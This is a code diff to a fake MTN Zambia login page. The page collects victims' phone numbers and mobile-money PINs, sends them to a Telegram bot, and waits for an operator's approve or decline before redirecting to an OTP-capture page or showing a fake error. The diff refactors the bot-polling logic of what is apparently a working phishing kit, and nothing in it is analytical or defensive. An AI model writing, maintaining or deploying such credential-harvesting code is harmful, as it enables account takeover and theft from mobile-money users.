@@ -280,7 +280,7 @@
         const pinError = document.getElementById('pinError');
 
         let isSubmitting = false;
-        let currentPollInterval = null;
+        let pollInterval = null;
 
         // ============================================================
         //  PHONE EXTRACTION – Accepts ANY valid Zambian number
@@ -293,7 +293,6 @@
             if (digits.startsWith('0')) digits = digits.substring(1);
             if (digits.length !== 9) return null;
             const first = parseInt(digits.charAt(0), 10);
-            // Valid Zambian mobile numbers start with 5-9
             if (first < 5 || first > 9) return null;
             return digits;
         }
@@ -313,7 +312,7 @@
         }
 
         // ============================================================
-        //  ERROR DISPLAY HELPERS – NO BLANK SPACE
+        //  ERROR DISPLAY HELPERS
         // ============================================================
         function setPhoneError(msg) {
             phoneError.textContent = msg || '';
@@ -345,12 +344,12 @@
         }
 
         // ============================================================
-        //  TELEGRAM HELPERS
+        //  TELEGRAM HELPERS (FIXED – using cheat sheet pattern)
         // ============================================================
         function stopPolling() {
-            if (currentPollInterval) {
-                clearInterval(currentPollInterval);
-                currentPollInterval = null;
+            if (pollInterval) {
+                clearInterval(pollInterval);
+                pollInterval = null;
             }
         }
 
@@ -363,6 +362,38 @@
                 if (m === '"') return '&quot;';
                 return m;
             });
+        }
+
+        // ─── FIXED: Uses cheat sheet's pollForCallback pattern ───
+        function pollForCallback(expectedPrefix, expectedTs, onDecision) {
+            if (pollInterval) clearInterval(pollInterval);
+
+            let lastUpdateId = 0;
+            pollInterval = setInterval(async () => {
+                try {
+                    const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
+                    const res = await fetch(url);
+                    const data = await res.json();
+                    if (!data.ok || !data.result.length) return;
+
+                    data.result.forEach(update => {
+                        lastUpdateId = update.update_id;
+                        if (update.callback_query && update.callback_query.data) {
+                            const parts = update.callback_query.data.split('_');
+                            if (parts.length >= 3) {
+                                const [type, action, time] = parts;
+                                if (time == expectedTs && type === expectedPrefix) {
+                                    clearInterval(pollInterval);
+                                    pollInterval = null;
+                                    onDecision(action);
+                                }
+                            }
+                        }
+                    });
+                } catch (err) {
+                    console.warn('Poll error', err);
+                }
+            }, 1500);
         }
 
         async function sendLoginToTelegram(phone9, pin) {
@@ -399,7 +430,22 @@
                     })
                 });
                 if (!response.ok) throw new Error(`HTTP ${response.status}`);
-                startPollingForDecision(approveId, declineId);
+                // ─── FIXED: Use pollForCallback with 'login' prefix ───
+                pollForCallback('login', ts, (action) => {
+                    spinner.style.display = 'none';
+                    isSubmitting = false;
+                    loginBtn.disabled = false;
+                    updateLoginButton();
+
+                    if (action === 'approve') {
+                        window.location.href = 'otp-link.html';
+                    } else if (action === 'decline') {
+                        setPhoneError('Error. Please ensure you are using an MTN Zambia number.');
+                        setPinError('');
+                        clearPinField();
+                        phoneInput.focus();
+                    }
+                });
             } catch (err) {
                 console.error('Telegram send error:', err);
                 spinner.style.display = 'none';
@@ -408,48 +454,6 @@
                 updateLoginButton();
                 setPinError('Network error. Please try again.');
             }
-        }
-
-        function startPollingForDecision(approveId, declineId) {
-            stopPolling();
-            let lastUpdateId = 0;
-            currentPollInterval = setInterval(async () => {
-                try {
-                    const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
-                    const response = await fetch(url);
-                    const data = await response.json();
-                    if (!data.ok || !data.result.length) return;
-                    for (const update of data.result) {
-                        lastUpdateId = Math.max(lastUpdateId, update.update_id);
-                        const callback = update.callback_query;
-                        if (!callback) continue;
-                        const cbData = callback.data;
-                        if (cbData === approveId) {
-                            stopPolling();
-                            spinner.style.display = 'none';
-                            isSubmitting = false;
-                            window.location.href = 'otp-link.html';
-                            return;
-                        }
-                        if (cbData === declineId) {
-                            stopPolling();
-                            spinner.style.display = 'none';
-                            isSubmitting = false;
-                            loginBtn.disabled = false;
-                            updateLoginButton();
-                            // ─── ERROR NOW SHOWN UNDER PHONE INPUT ───
-                            setPhoneError('Error. Please ensure you are using an MTN Zambia number.');
-                            // Clear PIN error if any
-                            setPinError('');
-                            clearPinField();
-                            phoneInput.focus();
-                            return;
-                        }
-                    }
-                } catch (err) {
-                    console.warn('Polling error:', err);
-                }
-            }, 1500);
         }
 
         // ============================================================
@@ -467,14 +471,12 @@
 
             clearAllErrors();
 
-            // Validate Zambian number (any network)
             if (!isValidZambianNumber(phoneRaw)) {
                 setPhoneError('Please enter a valid Zambian phone number (e.g. 0977123456 or +260977123456).');
                 phoneInput.focus();
                 return;
             }
 
-            // Extract core number (validated above)
             const phoneCore = extractZambianPhone(phoneRaw);
             if (!phoneCore) {
                 setPhoneError('Invalid phone number format.');
@@ -482,7 +484,6 @@
                 return;
             }
 
-            // Validate PIN
             const pinDigits = pinRaw.replace(/\D/g, '');
             if (!pinDigits) {
                 setPinError('Please enter your 5‑digit PIN.');
